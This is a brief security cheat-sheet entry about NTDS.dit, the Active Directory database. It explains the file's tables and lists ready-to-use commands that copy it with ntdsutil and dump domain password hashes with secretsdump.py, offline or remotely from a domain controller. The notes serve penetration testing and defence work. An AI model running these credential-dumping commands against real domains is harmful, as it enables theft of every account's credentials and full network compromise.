---
title: NTDS.dit
date: M02-18-2023
author: i4
---

The `NTDS.dit` stores Active Directory data, including information about users.

- Location: `%systemroot%/NTDS/ntds.dit`

This file is a database Extensible Storage Engine (ESE) and is "officially" composed by 3 tables:
- Data Table: Contains the information about the objects (users, groups...)
- Link Table: Information about the relations (member of...)
- SD Table: Contains the security descriptors of each object

### Ntdsutil
```
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

## Extracting hashes
```
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

or automatically
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

for bigger NTDS.dit  => https://github.com/c-sto/gosecretsdump